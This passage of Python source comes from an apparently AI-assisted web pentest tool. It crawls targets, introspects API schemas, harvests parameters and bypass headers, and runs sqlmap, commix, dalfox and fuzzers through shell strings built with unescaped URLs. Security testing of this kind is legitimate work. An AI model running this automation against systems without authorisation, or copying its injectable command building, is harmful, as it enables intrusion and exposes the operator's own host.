        js_src = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body, re.I)
        for src in js_src:
            js_url = self._resolve(src, url)
            if js_url and self._same_host(js_url) and js_url not in self.visited:
                r2 = self.client.get(js_url)
                if r2["status"] == 200:
                    all_js.append(r2["body"])
                    with self._lock:
                        self.visited.add(js_url)
        for js_block in all_js:
            for js_ep in self._extract_js_endpoints(js_block, url):
                with self._lock:
                    self.endpoints.append(js_ep)

        for api_ep in self._check_api_schema(url, body, resp["headers"]):
            with self._lock:
                self.endpoints.append(api_ep)

    def _extract_links(self, body: str, base: str) -> list[str]:
        links = []
        patterns = [
            r'href=["\']([^"\'#?][^"\']*)["\']',
            r'action=["\']([^"\']+)["\']',
            r'src=["\']([^"\']+\.(?:js|php|asp|aspx|jsp|py|rb|do|action))["\']',
            r'data-url=["\']([^"\']+)["\']',
            r'data-href=["\']([^"\']+)["\']',
            r'data-action=["\']([^"\']+)["\']',
            r'router\.push\(["\']([^"\']+)["\']',
            r'navigate\(["\']([^"\']+)["\']',
            r'history\.push\(["\']([^"\']+)["\']',
        ]
        for p in patterns:
            for m in re.finditer(p, body, re.I):
                url = self._resolve(m.group(1), base)
                if url and self._same_host(url):
                    links.append(url)
        return list(set(links))

    def _extract_forms(self, body: str, base_url: str) -> list[Endpoint]:
        endpoints = []
        form_blocks = re.findall(r'<form([^>]*)>(.*?)</form>', body, re.S | re.I)
        for attrs, content in form_blocks:
            action  = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            method  = re.search(r'method=["\']([^"\']*)["\']', attrs, re.I)
            enctype = re.search(r'enctype=["\']([^"\']*)["\']', attrs, re.I)
            url     = self._resolve(action.group(1) if action else "", base_url) or base_url
            meth    = (method.group(1) if method else "GET").upper()
            enc     = (enctype.group(1) if enctype else "application/x-www-form-urlencoded").lower()
            params  = {}
            for inp in re.finditer(r'<(?:input|textarea|select)([^>]*)>', content, re.I):
                iattrs = inp.group(1)
                name   = re.search(r'name=["\']([^"\']+)["\']', iattrs, re.I)
                value  = re.search(r'value=["\']([^"\']*)["\']', iattrs, re.I)
                itype  = re.search(r'type=["\']([^"\']+)["\']', iattrs, re.I)
                if name:
                    itype_val = itype.group(1).lower() if itype else "text"
                    if itype_val not in ("submit", "button", "image", "reset"):
                        params[name.group(1)] = value.group(1) if value else ""
            body_type = "multipart" if "multipart" in enc else ("json" if "json" in enc else "form")
            ep = Endpoint(url=url, method=meth, params=params, body_type=body_type, discovered_by="form", depth=0)
            endpoints.append(ep)
        return endpoints

    def _extract_js_endpoints(self, js: str, base: str) -> list[Endpoint]:
        endpoints = []
        patterns = [
            r'(?:fetch|axios\.(?:get|post|put|delete|patch)|ajax|xhr\.open)\s*\(["\']([^"\']+)["\']',
            r'(?:url|endpoint|api_url|baseURL|path)\s*[:=]\s*["\']([/][^"\']{3,})["\']',
            r'["\']([/](?:api|v\d|graphql|rest|gql)[/][^"\'?\s]{2,})["\']',
        ]
        for p in patterns:
            for m in re.finditer(p, js, re.I):
                path = m.group(1)
                url  = self._resolve(path, base)
                if url and self._same_host(url):
                    ep = self._url_to_endpoint(url, "GET", 0, "js_discovery")
                    endpoints.append(ep)
        return endpoints

    def _check_api_schema(self, url: str, body: str, headers: dict) -> list[Endpoint]:
        endpoints = []
        base = url.rstrip("/")
        schema_paths = [
            "/swagger.json", "/swagger/v1/swagger.json",
            "/openapi.json", "/api-docs", "/api/docs",
            "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
            "/graphql", "/graphiql", "/__graphql",
        ]
        for path in schema_paths:
            probe_url = urllib.parse.urljoin(base + "/", path.lstrip("/"))
            if probe_url in self.visited:
                continue
            r = self.client.get(probe_url)
            if r["status"] in (200, 201):
                self.visited.add(probe_url)
                if "swagger" in r["body"][:200].lower() or "openapi" in r["body"][:200].lower():
                    eps = self._parse_openapi(r["body"], probe_url)
                    endpoints.extend(eps)
                elif "graphql" in probe_url:
                    endpoints.extend(self._graphql_introspect(probe_url))
        return endpoints

    def _parse_openapi(self, body: str, schema_url: str) -> list[Endpoint]:
        endpoints = []
        try:
            schema = json.loads(body)
        except Exception:
            return endpoints
        base_path  = schema.get("basePath", "") or ""
        servers    = schema.get("servers", [])
        server_url = servers[0].get("url", "") if servers else ""
        host_base  = server_url or urllib.parse.urljoin(schema_url, base_path)
        for path, methods in schema.get("paths", {}).items():
            for method, op in methods.items():
                if method.lower() not in ("get","post","put","delete","patch","options"):
                    continue
                full_url = host_base.rstrip("/") + path
                params   = {}
                for param in op.get("parameters", []):
                    pname  = param.get("name", "")
                    pin    = param.get("in", "query")
                    schema_= param.get("schema", {})
                    ptype  = schema_.get("type", "string")
                    ex     = schema_.get("example", self._default_for_type(ptype))
                    params[f"{pin}:{pname}"] = str(ex)
                ep = Endpoint(url=full_url, method=method.upper(), params=params,
                              body_type="json", discovered_by="openapi_schema")
                endpoints.append(ep)
        return endpoints

    def _graphql_introspect(self, url: str) -> list[Endpoint]:
        query = '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}'
        r = self.client.post(url, data=query, extra_headers={"Content-Type": "application/json"})
        endpoints = []
        if r["status"] == 200:
            try:
                data  = json.loads(r["body"])
                types = data.get("data", {}).get("__schema", {})
                for ttype in ["queryType", "mutationType"]:
                    for f in (types.get(ttype) or {}).get("fields", []):
                        ep = Endpoint(url=url, method="POST",
                                      params={"body:query": f"{{ {f['name']} }}"},
                                      body_type="json", discovered_by="graphql")
                        endpoints.append(ep)
            except Exception:
                pass
        return endpoints

    def _url_to_endpoint(self, url: str, method: str, depth: int, source: str) -> Endpoint:
        parsed = urllib.parse.urlparse(url)
        params = {}
        for k, v in urllib.parse.parse_qsl(parsed.query):
            params[f"query:{k}"] = v
        return Endpoint(url=url, method=method, params=params, discovered_by=source, depth=depth)

    def _resolve(self, href: str, base: str) -> Optional[str]:
        if not href or href.startswith(("mailto:", "tel:", "javascript:", "#", "data:")):
            return None
        try:
            return urllib.parse.urljoin(base, href).split("#")[0]
        except Exception:
            return None

    def _same_host(self, url: str) -> bool:
        try:
            return urllib.parse.urlparse(url).netloc == self.base_host
        except Exception:
            return False

    def _default_for_type(self, t: str) -> Any:
        return {"string": "test", "integer": 1, "boolean": True, "number": 1.0, "array": []}.get(t, "test")


# ─────────────────────────────────────────────────────────────────────────────
# PARAMETER DISCOVERER
# ─────────────────────────────────────────────────────────────────────────────
class ParamDiscoverer:
    INTERESTING_HEADERS = [
        "X-User-Id", "X-User", "X-Role", "X-Admin", "X-Privilege",
        "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
        "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
        "X-Custom-IP-Authorization", "X-Forwarded-Host",
        "X-HTTP-Method-Override", "X-Method-Override",
        "Referer", "Origin", "Host",
        "X-Debug", "X-Test", "X-Internal",
        "Authorization", "X-API-Key", "X-Auth-Token",
    ]

    def __init__(self, client: HTTPClient, wl_selector: "AIWordlistSelector"):
        self.client      = client
        self.wl_selector = wl_selector

    def discover(self, ep: Endpoint) -> Endpoint:
        resp = self.client.get(ep.url) if ep.method == "GET" else \
               self.client.post(ep.url, data=ep.params)
        if resp["status"] == 0:
            return ep
        body = resp["body"]
        ct   = resp["headers"].get("content-type", "").lower()

        parsed = urllib.parse.urlparse(ep.url)
        for k, v in urllib.parse.parse_qsl(parsed.query):
            ep.params[f"query:{k}"] = v
        for m in re.finditer(r'/(\d+)(?=/|$)', parsed.path):
            ep.params[f"path:id"] = m.group(1)
        for m in re.finditer(r'/\{([^}]+)\}', parsed.path):
            ep.params[f"path:{m.group(1)}"] = "1"

        ep.params.update(self._from_html_forms(body))
        ep.params.update(self._from_hidden_inputs(body))

        if "json" in ct or ep.body_type == "json":
            ep.body_type = "json"
            ep.params.update(self._from_json(body))

        ep.params.update(self._from_js_vars(body))
        ep.params.update(self._from_data_attrs(body))
        ep.params.update(self._from_cookies(resp["headers"]))

        for h in self.INTERESTING_HEADERS:
            ep.params[f"header:{h}"] = ""

        if "graphql" in ep.url.lower() or "gql" in ep.url.lower():
            ep.params.update(self._from_graphql(ep.url))
            ep.body_type = "json"

        if shutil.which("ffuf"):
            # AI kontekstini to'plash
            server_hdr = resp["headers"].get("server", resp["headers"].get("Server", ""))
            tech_info  = RiskScorer.detect_tech(resp)
            ctx = {
                "url":         ep.url,
                "param":       "param_discovery",
                "tech":        tech_info.get("lang", "unknown"),
                "param_type":  "params",
                "server":      server_hdr,
                "page_title":  "",
            }
            wl = self.wl_selector.select("params", ctx)
            ep.params.update(self._ffuf_param_discover(ep, wl))

        return ep

    def _from_html_forms(self, body: str) -> dict:
        params = {}
        for m in re.finditer(
            r'<(?:input|textarea|select)[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
            body, re.I
        ):
            itype_m = re.search(r'type=["\']([^"\']+)["\']', m.group(0), re.I)
            itype   = itype_m.group(1).lower() if itype_m else "text"
            if itype not in ("submit", "button", "image", "reset"):
                params[f"form:{m.group(1)}"] = m.group(2) or ""
        return params

    def _from_hidden_inputs(self, body: str) -> dict:
        params = {}
        for m in re.finditer(
            r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            body, re.I
        ):
            params[f"hidden:{m.group(1)}"] = m.group(2)
        return params

    def _from_json(self, body: str) -> dict:
        params = {}
        try:
            data = json.loads(body)
            for k, v in self._flatten_json(data).items():
                params[f"json:{k}"] = str(v)[:100]
        except Exception:
            for m in re.finditer(r'\{[^{}]{10,500}\}', body):
                try:
                    obj = json.loads(m.group())
                    for k, v in obj.items():
                        if isinstance(v, (str, int, float, bool)):
                            params[f"json:{k}"] = str(v)[:50]
                except Exception:
                    pass
        return params

    def _from_js_vars(self, body: str) -> dict:
        params = {}
        patterns = [
            r'(?:var|let|const)\s+(\w+)\s*=\s*["\']([^"\']{1,80})["\']',
            r'window\.(\w+)\s*=\s*["\']([^"\']{1,80})["\']',
        ]
        sensitive_keys = ["id","token","key","user","role","param","secret","api","auth","session","csrf"]
        for p in patterns:
            for m in re.finditer(p, body):
                name = m.group(1).lower()
                if any(k in name for k in sensitive_keys):
                    params[f"js:{m.group(1)}"] = m.group(2)
        return params

    def _from_data_attrs(self, body: str) -> dict:
        params = {}
        for m in re.finditer(
            r'data-(id|user|token|key|param|role|value|action|url|api)[^=]*=["\']([^"\']+)["\']',
            body, re.I
        ):
            params[f"data:{m.group(1)}"] = m.group(2)
        return params

    def _from_cookies(self, headers: dict) -> dict:
        params = {}
        cookies = headers.get("set-cookie", "")
        if not cookies:
            return params
        for part in cookies.split(";"):
            part = part.strip()
            if "=" in part and not any(k in part.lower() for k in ["path=","domain=","expires=","max-age=","samesite=","httponly","secure"]):
                k, v = part.split("=", 1)
                params[f"cookie:{k.strip()}"] = v.strip()[:50]
        return params

    def _from_graphql(self, url: str) -> dict:
        params = {}
        query = '{"query":"{ __schema { types { name kind fields { name } } } }"}'
        r = self.client.post(url, data=query, extra_headers={"Content-Type": "application/json"})
        if r["status"] != 200:
            return params
        try:
            schema = json.loads(r["body"])
            types  = schema.get("data", {}).get("__schema", {}).get("types", [])
            for t in types:
                if t.get("kind") == "INPUT_OBJECT":
                    for f in (t.get("fields") or []):
                        params[f"graphql_input:{t['name']}.{f['name']}"] = ""
        except Exception:
            pass
        return params

    def _ffuf_param_discover(self, ep: Endpoint, wordlist: str) -> dict:
        if not wordlist or not Path(wordlist).exists():
            return {}
        fuzz_url = ep.url + ("&" if "?" in ep.url else "?") + "FUZZ=pentestai"
        cmd = (f"ffuf -u '{fuzz_url}' -w {wordlist} -mc 200,201,301,302 "
               f"-fs 0 -t 20 -timeout 5 -s")
        r   = _run_cmd(cmd, timeout=40)
        params = {}
        for line in r.get("output","").splitlines():
            line = line.strip()
            if line and not line.startswith(("[","#","/","{")):
                params[f"discovered:{line}"] = "pentestai"
        return params

    def _flatten_json(self, obj: Any, prefix: str = "", depth: int = 0) -> dict:
        result = {}
        if depth > 4:
            return result
        if isinstance(obj, dict):
            for k, v in obj.items():
                result.update(self._flatten_json(v, f"{prefix}{k}.", depth+1))
        elif isinstance(obj, list) and obj:
            result.update(self._flatten_json(obj[0], f"{prefix}0.", depth+1))
        else:
            result[prefix.rstrip(".")] = obj
        return result


# ─────────────────────────────────────────────────────────────────────────────
# BASELINE ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class BaselineEngine:
    def __init__(self, client: HTTPClient):
        self.client        = client
        self._cache        : dict[str, BaselineFingerprint] = {}
        self._custom404_fp : Optional[BaselineFingerprint]  = None

    def build_custom_404(self, base_url: str):
        rand_path = f"/pentest_nonexistent_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        url = base_url.rstrip("/") + rand_path
        r   = self.client.get(url)
        if r["status"] != 0:
            self._custom404_fp = BaselineFingerprint(
                status       = r["status"],
                body_len     = len(r["body"]),
                body_hash    = hashlib.md5(r["body"].encode()).hexdigest(),
                title        = self._extract_title(r["body"]),
                timing_avg   = r["timing"],
                headers_sig  = "",
                word_count   = len(r["body"].split()),
                error_strings= self._extract_error_strings(r["body"]),
            )


    def build_smart_profile(self, base_url: str, ai: "AIEngine",
                            depth: int = 2) -> "SmartFuzzProfile":
        """
        5 ta turli random URL probeb qilib Smart Fuzz Profile hosil qiladi.

        Jarayon:
        1. 5 ta TURLI random path yuboradi (har biri unique suffix)
        2. Natijalarni yig'adi: status, size, words, lines, title, hash
        3. AI tahlil qiladi — qaysi parametrlar "404 signature" ekanini aniqlaydi
        4. Tolerance hisoblanadi (±% farq)
        5. SmartFuzzProfile qaytariladi — ffuf/gobuster/wfuzz tayyor argumentlar bilan

        Bu funksiya ham well_known probing dan OLDIN, ham har yangi papka
        topilganda chaqiriladi (rekursiv fuzzing uchun).
        """
        import random, string

        base = base_url.rstrip("/")
        probes = []

        # 5 ta turli random path — har biri boshqacha pattern
        paths = [
            f"/{''.join(random.choices(string.ascii_lowercase, k=12))}",
            f"/{''.join(random.choices(string.ascii_lowercase, k=8))}.php",
            f"/admin_{''.join(random.choices(string.digits, k=6))}",
            f"/api/{''.join(random.choices(string.ascii_lowercase, k=10))}",
            f"/{''.join(random.choices(string.ascii_lowercase, k=6))}/{''.join(random.choices(string.ascii_lowercase, k=6))}",
        ]

        console.print(f"  [dim]  SmartProfile: probing 5 random paths at {base}...[/dim]")

        for path in paths:
            url = base + path
            r   = self.client.get(url)
            if r["status"] == 0:
                continue
            body      = r["body"]
            words     = len(body.split())
            lines     = body.count("\n")
            b_hash    = hashlib.md5(body.encode()).hexdigest()
            title_m   = re.search(r'<title[^>]*>(.*?)</title>', body, re.I | re.S)
            title     = title_m.group(1).strip()[:60] if title_m else ""
            probe     = {
                "url":    url,
                "path":   path,
                "status": r["status"],
                "size":   len(body),
                "words":  words,
                "lines":  lines,
                "title":  title,
                "hash":   b_hash,
            }
            probes.append(probe)
            console.print(
                f"  [dim]    {path} -> {r['status']}  "
                f"size={len(body)}  words={words}  lines={lines}  "
                f"title={title[:40]}[/dim]"
            )

        if not probes:
            console.print("  [dim yellow]  SmartProfile: no probe responses[/dim yellow]")
            return SmartFuzzProfile(
                base_url=base, probe_results=[], filter_codes=[], filter_sizes=[],
                filter_words=[], filter_lines=[], filter_hashes=[], match_codes=[200,201,301,302],
                tolerance_bytes=10, ai_explanation="No probes succeeded",
                recursive=True, depth=depth,
            )

        # ── AI tahlil ──────────────────────────────────────────────────────────
        ai_result = ai.analyze_fuzz_baseline(base_url=base, probes=probes)

        filter_codes  = ai_result.get("filter_codes",  [])
        filter_sizes  = ai_result.get("filter_sizes",  [])
        filter_words  = ai_result.get("filter_words",  [])
        filter_lines  = ai_result.get("filter_lines",  [])
        tolerance     = ai_result.get("tolerance_bytes", 20)
        explanation   = ai_result.get("explanation", "")
        recursive     = ai_result.get("recursive", True)

        # AI javob bermasa — heuristic fallback
        if not filter_codes and not filter_sizes:
            filter_codes, filter_sizes, filter_words, filter_lines = \
                self._heuristic_filters(probes)

        profile = SmartFuzzProfile(
            base_url        = base,
            probe_results   = probes,
            filter_codes    = filter_codes,
            filter_sizes    = filter_sizes,
            filter_words    = filter_words,
            filter_lines    = filter_lines,
            filter_hashes   = list({p["hash"] for p in probes}),
            match_codes     = [200, 201, 204, 301, 302, 307],
            tolerance_bytes = tolerance,
            ai_explanation  = explanation,
            recursive       = recursive,
            depth           = depth,
        )

        console.print(
            f"  [bold cyan]  SmartProfile ready:[/bold cyan] "
            f"[dim]{profile.summary()}[/dim]"
        )
        if explanation:
            console.print(f"  [dim]  AI: {explanation}[/dim]")

        return profile

    def _heuristic_filters(self, probes: list) -> tuple:
        """AI yo'q bo'lsa — probe natijalari bo'yicha heuristic filter."""
        statuses = [p["status"] for p in probes]
        sizes    = [p["size"]   for p in probes]
        words    = [p["words"]  for p in probes]
        lines    = [p["lines"]  for p in probes]
        hashes   = [p["hash"]   for p in probes]

        filter_codes, filter_sizes, filter_words, filter_lines = [], [], [], []

        # Hammasi bir xil status → filter
        if len(set(statuses)) == 1:
            filter_codes = list(set(statuses))

        # Sizlar bir hil (±5% tolerance) → filter
        if sizes:
            avg_size   = sum(sizes) / len(sizes)
            max_dev    = max(abs(s - avg_size) for s in sizes)
            rel_dev    = max_dev / max(avg_size, 1)
            if rel_dev < 0.05:  # 5% dan kam farq
                # Barcha unique sizelarni filter'ga qo'shamiz
                filter_sizes = list(set(sizes))
            elif rel_dev < 0.15:  # 15% gacha — word count orqali filter
                if len(set(words)) <= 2:
                    filter_words = list(set(words))

        # Barcha hash bir xil → aniq custom 404
        if len(set(hashes)) == 1 and hashes:
            if not filter_codes:
                filter_codes = list(set(statuses))
            if not filter_sizes:
                filter_sizes = list(set(sizes))

        return filter_codes, filter_sizes, filter_words, filter_lines


    def get(self, ep: Endpoint) -> BaselineFingerprint:
        key = f"{ep.method}:{ep.url}"
        if key in self._cache:
            return self._cache[key]
        timings, sizes, hashes, statuses, bodies = [], [], [], [], []
        for _ in range(BASELINE_REPEATS):
            r = self._send(ep)
            if r["status"] == 0:
                continue
            timings.append(r["timing"])
            sizes.append(len(r["body"]))
            hashes.append(hashlib.md5(r["body"].encode()).hexdigest())
            statuses.append(r["status"])
            bodies.append(r["body"])
            time.sleep(0.2)
        if not statuses:
            return BaselineFingerprint(0, 0, "", "", 0, "", 0, [])
        canonical_body = bodies[-1] if bodies else ""
        fp = BaselineFingerprint(
            status       = max(set(statuses), key=statuses.count),
            body_len     = int(sum(sizes) / max(len(sizes), 1)),
            body_hash    = max(set(hashes), key=hashes.count),
            title        = self._extract_title(canonical_body),
            timing_avg   = round(sum(timings) / max(len(timings), 1), 3),
            headers_sig  = "",
            word_count   = len(canonical_body.split()),
            error_strings= self._extract_error_strings(canonical_body),
        )
        self._cache[key] = fp
        return fp

    def diff(self, baseline: BaselineFingerprint, resp: dict, timing: float) -> dict:
        body   = resp.get("body", "")
        b_hash = hashlib.md5(body.encode()).hexdigest()
        return {
            "status_changed"  : resp["status"] != baseline.status,
            "status_diff"     : f"{baseline.status} → {resp['status']}",
            "size_diff"       : len(body) - baseline.body_len,
            "size_pct"        : round(abs(len(body) - baseline.body_len) / max(baseline.body_len, 1) * 100, 1),
            "hash_changed"    : b_hash != baseline.body_hash,
            "title_changed"   : self._extract_title(body) != baseline.title,
            "new_title"       : self._extract_title(body),
            "timing_diff"     : round(timing - baseline.timing_avg, 3),
            "time_anomaly"    : timing > baseline.timing_avg + 2.5,
            "new_errors"      : [e for e in self._extract_error_strings(body) if e not in baseline.error_strings],
            "word_diff"       : len(body.split()) - baseline.word_count,
            "content_length"  : len(body),
            "is_custom_404"   : self._is_custom_404(resp, body),
            "sensitive_keys"  : RiskScorer.score_body(body),
        }

    def is_real_200(self, resp: dict) -> dict:
        body   = resp.get("body", "")
        status = resp.get("status", 0)
        if status != 200:
            return {"real": False, "reason": f"Status {status}", "ai_needed": False}
        if self._custom404_fp:
            size_match  = abs(len(body) - self._custom404_fp.body_len) < 50
            title_match = self._extract_title(body) == self._custom404_fp.title
            hash_match  = hashlib.md5(body.encode()).hexdigest() == self._custom404_fp.body_hash
            if hash_match or (size_match and title_match):
                return {"real": False, "reason": "Matches custom 404 fingerprint", "ai_needed": False}
        if len(body) < 100:
            return {"real": False, "reason": "Body too short", "ai_needed": False}
        return {"real": True, "reason": "Passes all checks", "ai_needed": False}

    def _is_custom_404(self, resp: dict, body: str) -> bool:
        if not self._custom404_fp:
            return False
        return (abs(len(body) - self._custom404_fp.body_len) < 50 and
                self._extract_title(body) == self._custom404_fp.title)

    def _send(self, ep: Endpoint) -> dict:
        if ep.method == "GET":
            return self.client.get(ep.url)
        return self.client.post(ep.url, data=ep.params)

    def _extract_title(self, body: str) -> str:
        m = re.search(r'<title[^>]*>(.*?)</title>', body, re.I | re.S)
        return m.group(1).strip()[:100] if m else ""

    def _extract_error_strings(self, body: str) -> list:
        patterns = [
            r"(?i)(error|exception|warning|fatal|syntax|undefined|traceback)",
            r"SQL syntax|mysql_|ORA-\d+|pg::syntax|sqlite",
            r"stack trace|at line \d+|undefined variable",
        ]
        found = []
        for p in patterns:
            for m in re.finditer(p, body):
                found.append(m.group()[:50])
        return list(set(found))[:15]


# ─────────────────────────────────────────────────────────────────────────────
# KALI TOOL RUNNER
# ─────────────────────────────────────────────────────────────────────────────
class KaliToolRunner:
    def __init__(self, session: SessionContext, wl_selector: "AIWordlistSelector"):
        self.session     = session
        self.wl_selector = wl_selector

    def _cookie_str(self) -> str:
        return "; ".join(f"{k}={v}" for k, v in self.session.cookies.items())

    def _auth_opts(self, tool: str) -> str:
        opts = ""
        if self.session.cookies and tool in ("sqlmap", "dalfox", "ffuf", "wfuzz"):
            c = self._cookie_str()
            opts += f' --cookie="{c}"' if tool == "sqlmap" else f" -H 'Cookie: {c}'"
        if self.session.jwt_token:
            opts += f" -H 'Authorization: Bearer {self.session.jwt_token}'"
        return opts

    def sqlmap(self, url: str, param: str, method: str = "GET",
               data: str = "", level: int = 2) -> dict:
        if not shutil.which("sqlmap"):
            return {"tool": "sqlmap", "available": False, "output": "sqlmap not found"}
        auth  = self._auth_opts("sqlmap")
        pname = param.split(":")[-1]
        base  = f"sqlmap -u '{url}' --batch --level={level} --risk=1 --timeout=10 --retries=1 --no-cast {auth}"
        cmd   = f"{base} --data='{data}' -p '{pname}'" if method == "POST" and data else f"{base} -p '{pname}'"
        r = _run_cmd(cmd, timeout=120)
        r["tool"] = "sqlmap"
        return r

    def dalfox(self, url: str, param: str = "", data: str = "", method: str = "GET") -> dict:
        if not shutil.which("dalfox"):
            return {"tool": "dalfox", "available": False, "output": "dalfox not found"}
        auth  = self._auth_opts("dalfox")
        pname = param.split(":")[-1]
        cmd   = f"dalfox url '{url}' --data '{data}' --silence {auth}" if method == "POST" and data else f"dalfox url '{url}' --silence {auth}"
        if pname:
            cmd += f" --param {pname}"
        r = _run_cmd(cmd, timeout=60)
        r["tool"] = "dalfox"
        return r

    def commix(self, url: str, param: str = "", data: str = "", method: str = "GET") -> dict:
        if not shutil.which("commix"):
            return {"tool": "commix", "available": False, "output": "commix not found"}
        auth  = self._auth_opts("commix")
        pname = param.split(":")[-1]
        cmd   = f"commix --url='{url}' --data='{data}' --batch {auth}" if method == "POST" and data else f"commix --url='{url}' --batch {auth}"
        if pname:
            cmd += f" -p {pname}"
        r = _run_cmd(cmd, timeout=90)
        r["tool"] = "commix"
        return r

    def ffuf(self, url: str, wordlist: str = "", extra_opts: str = "") -> dict:
        if not shutil.which("ffuf"):
            return {"tool": "ffuf", "available": False, "output": "ffuf not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "ffuf", "available": False, "output": "No wordlist"}
        auth = self._auth_opts("ffuf")
        cmd  = f"ffuf -u '{url}' -w '{wordlist}' -mc 200,201,301,302,403 -fs 0 -t 20 -timeout 8 -s {auth} {extra_opts}"
        r = _run_cmd(cmd, timeout=60)
        r["tool"] = "ffuf"
        return r

    def wfuzz(self, url: str, data: str = "", wordlist: str = "", hc: str = "404") -> dict:
        if not shutil.which("wfuzz"):
            return {"tool": "wfuzz", "available": False, "output": "wfuzz not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "wfuzz", "available": False, "output": "No wordlist"}
        auth = self._auth_opts("wfuzz")
        base = f"wfuzz -w '{wordlist}' --hc={hc} -t 20 {auth}"
        cmd  = f"{base} -d '{data}' '{url}'" if data else f"{base} '{url}'"
        r = _run_cmd(cmd, timeout=60)
        r["tool"] = "wfuzz"
        return r

    def nikto(self, target: str) -> dict:
        if not shutil.which("nikto"):
            return {"tool": "nikto", "available": False, "output": "nikto not found"}
        cmd = f"nikto -h '{target}' -nointeractive -timeout 10 -maxtime 120s"
        r   = _run_cmd(cmd, timeout=150)
        r["tool"] = "nikto"
        return r

    def smart_ffuf(self, base_url: str, wordlist: str,
                   profile: "SmartFuzzProfile",
                   mode: str = "dir",
                   extra_opts: str = "") -> dict:
        """
        SmartFuzzProfile asosida adaptive ffuf fuzzing.

        mode:
          "dir"   — papka/fayl topish (FUZZ at end of URL)
          "param" — GET parametr topish (url?FUZZ=val)
          "vhost" — virtual host fuzzing (Host header)

        Qo'shimcha xususiyatlar:
          - Rekursiv: topilgan papkalar ichida ham fuzz qiladi
          - AI har topilgan narsani tekshiradi
          - Har qatlamda yangi SmartProfile hosil qilinadi
        """
        if not shutil.which("ffuf"):
            return {"tool": "smart_ffuf", "available": False, "output": "ffuf not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "smart_ffuf", "available": False, "output": f"Wordlist not found: {wordlist}"}

        auth         = self._auth_opts("ffuf")
        filter_args  = profile.ffuf_filter_args()
        base         = base_url.rstrip("/")

        if mode == "dir":
            fuzz_url = f"{base}/FUZZ"
        elif mode == "param":
            sep      = "&" if "?" in base_url else "?"
            fuzz_url = f"{base}{sep}FUZZ=pentest"
        elif mode == "vhost":
            fuzz_url = base
            auth    += f" -H 'Host: FUZZ'"
        else:
            fuzz_url = f"{base}/FUZZ"

        # ffuf JSON output uchun -o va -of json
        out_file = f"/tmp/ffuf_result_{hashlib.md5(base_url.encode()).hexdigest()[:8]}.json"

        cmd = (
            f"ffuf -u '{fuzz_url}' -w '{wordlist}' "
            f"-mc {','.join(str(c) for c in profile.match_codes)} "
            f"{filter_args} "
            f"-t 40 -timeout 8 "
            f"-o '{out_file}' -of json "
            f"-s "  # silent mode — progress barni o'chir
            f"{auth} {extra_opts}"
        )

        console.print(f"  [dim]  smart_ffuf: {fuzz_url}[/dim]")
        console.print(f"  [dim]  filters: {profile.summary()}[/dim]")
        console.print(f"  [dim]  cmd: {cmd[:120]}[/dim]")

        r = _run_cmd(cmd, timeout=120)
        r["tool"]       = "smart_ffuf"
        r["fuzz_url"]   = fuzz_url
        r["filter_args"]= filter_args
        r["out_file"]   = out_file

        # JSON output'dan natijalarni parse qilish
        r["results"] = self._parse_ffuf_json(out_file)
        console.print(
            f"  [dim]  smart_ffuf done: {len(r["results"])} hits "
            f"(filtered by: {profile.summary()})[/dim]"
        )
        return r

    def smart_gobuster(self, base_url: str, wordlist: str,
                       profile: "SmartFuzzProfile",
                       extensions: str = "php,html,js,txt,json,bak,sql,zip") -> dict:
        """
        SmartFuzzProfile asosida adaptive gobuster fuzzing.
        gobuster -x extensions + --exclude-length filter.
        """
        if not shutil.which("gobuster"):
            return {"tool": "smart_gobuster", "available": False, "output": "gobuster not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "smart_gobuster", "available": False,
                    "output": f"Wordlist not found: {wordlist}"}

        auth         = self._auth_opts("gobuster")
        filter_args  = profile.gobuster_filter_args()
        out_file     = f"/tmp/gobuster_{hashlib.md5(base_url.encode()).hexdigest()[:8]}.txt"

        cmd = (
            f"gobuster dir -u '{base_url}' -w '{wordlist}' "
            f"-x {extensions} "
            f"-t 30 --timeout 8s "
            f"{filter_args} "
            f"-o '{out_file}' "
            f"-q "  # quiet
            f"{auth}"
        )

        console.print(f"  [dim]  smart_gobuster: {base_url}[/dim]")
        console.print(f"  [dim]  filters: {profile.gobuster_filter_args()}[/dim]")

        r = _run_cmd(cmd, timeout=180)
        r["tool"]     = "smart_gobuster"
        r["out_file"] = out_file
        r["results"]  = self._parse_gobuster_txt(out_file)
        console.print(f"  [dim]  gobuster done: {len(r["results"])} hits[/dim]")
        return r

    def smart_wfuzz(self, url: str, data: str = "", wordlist: str = "",
                    profile: "SmartFuzzProfile" = None) -> dict:
        """
        SmartFuzzProfile asosida adaptive wfuzz fuzzing.
        """
        if not shutil.which("wfuzz"):
            return {"tool": "smart_wfuzz", "available": False, "output": "wfuzz not found"}
        if not wordlist or not Path(wordlist).exists():
            return {"tool": "smart_wfuzz", "available": False, "output": "No wordlist"}

        auth         = self._auth_opts("wfuzz")
        filter_args  = profile.wfuzz_filter_args() if profile else "--hc 404"
        base         = f"wfuzz -w '{wordlist}' {filter_args} -t 30 {auth}"
        cmd          = f"{base} -d '{data}' '{url}'" if data else f"{base} '{url}'"

        console.print(f"  [dim]  smart_wfuzz: {url}[/dim]")
        console.print(f"  [dim]  filters: {filter_args}[/dim]")

        r = _run_cmd(cmd, timeout=90)
        r["tool"] = "smart_wfuzz"
        return r

    def _parse_ffuf_json(self, out_file: str) -> list:
        """ffuf JSON output'dan natijalarni o'qiydi."""
        try:
            p = Path(out_file)
            if not p.exists():
                return []
            data    = json.loads(p.read_text())
            results = []
            for item in data.get("results", []):
                results.append({
                    "input":  item.get("input", {}).get("FUZZ", ""),
                    "status": item.get("status", 0),
                    "size":   item.get("length", 0),
                    "words":  item.get("words", 0),
                    "lines":  item.get("lines", 0),
                    "url":    item.get("url", ""),
                })
            return results
        except Exception as e:
            return []

